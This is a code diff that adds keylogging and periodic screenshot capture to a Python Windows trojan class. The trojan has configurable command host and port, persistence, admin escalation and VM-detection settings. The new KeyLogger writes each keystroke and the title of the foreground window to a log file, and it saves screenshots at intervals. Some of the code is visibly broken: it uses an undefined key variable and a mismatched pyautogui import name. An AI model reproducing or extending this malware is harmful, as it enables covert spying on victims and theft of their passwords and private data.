@@ -7,6 +7,61 @@ import sys
 import winreg as reg
 import ctypes as c
 
+from pynput import keyboard as kb
+from win32gui import GetWindowText, GetForegroundWindow
+import pyautogui as pg
+
+
+class KeyLogger:
+    def __init__(self, auto_screenshot=False, time_screenshot=5):
+        self.last_window = None
+        self.auto_screenshot = auto_screenshot
+        self.time_screenshot = time_screenshot
+        self.screenshot_thread = threading.Thread(target=self.exec_auto_screenshot, daemon=True)
+
+        if self.auto_screenshot:
+            self.screenshot_thread.start()
+
+        with kb.Listener(on_press=lambda _: self.press()) as listner:
+            listner.join()
+
+    def press(self):
+        window = GetWindowText(GetForegroundWindow())
+        if window != self.last_window:
+            self.last_window = window
+            with open('keyboard.log', 'a') as f:
+                f.write(f"\n #### {window} - {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} #### \n")
+
+        if hasattr(key, 'char'):
+            if int(key.vk) in [96, 97, 98, 99, 100, 101, 102, 103, 104, 105]:
+                value = str(int(key.vk) - 96)
+            else:
+                value = key.char
+        elif hasattr(key, 'name'):
+            if key.name == 'enter':
+                value = f' [{key.name}] \n'
+            else:
+                value = f' [{key.name}] '
+        else:
+            value = str(key)
+
+        with open('keyboard.log', 'a') as f:
+            f.write(value)
+
+    def exec_auto_screenshot(self):
+        if self.time_screenshot < 5:
+            self.time_screenshot = 5
+
+        while self.auto_screenshot:
+            time.sleep(self.time_screenshot)
+            filename = f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png"
+            path = os.path.join(os.path.join(os.getcwd(), 'prints'))
+            screen = pyautogui.screenshot()
+            screen.save(os.path.join(path, filename))
+
+    def screenshot(self):
+        pass
+
 
 class Trojan:
     try:
@@ -18,6 +73,8 @@ class Trojan:
         PERSIST = comp.PERSIST
         ADMIN = comp.ADMIN
         DETECT_VM = comp.DETECT_VM
+        AUTO_SCREENSHOT = comp.AUTO_SCREENSHOT
+        TIME_SCREENSHOT = comp.TIME_SCREENSHOT
     except (ImportError, AttributeError) as e:
         HOST = "127.0.0.1"
         PORT = 469
@@ -25,9 +82,21 @@ class Trojan:
         PERSIST = False
         ADMIN = False
         DETECT_VM = False
+        AUTO_SCREENSHOT = False
+        TIME_SCREENSHOT = 5
         # c.windll.user32.MessageBoxW(0, str(e), "err")
 
-    def __init__(self, host=HOST, port=PORT, activate=ACTIVATE, persist=PERSIST, admin=ADMIN, try_detect_vm=DETECT_VM):
+    def __init__(
+            self,
+            host=HOST,
+            port=PORT,
+            activate=ACTIVATE,
+            persist=PERSIST,
+            admin=ADMIN,
+            try_detect_vm=DETECT_VM,
+            auto_screenshot=AUTO_SCREENSHOT,
+            time_screenshot=TIME_SCREENSHOT
+    ):
         self.client = None
         self.is_vm = False
         self.host = host
@@ -37,6 +106,8 @@ class Trojan:
         self.admin = admin
         self.try_detect_vm = try_detect_vm
         self.filename = os.path.basename(sys.argv[0])
+
+        self.keylogger = KeyLogger(auto_screenshot, time_screenshot)
 
         if self.try_detect_vm:
             self.detect_vm()
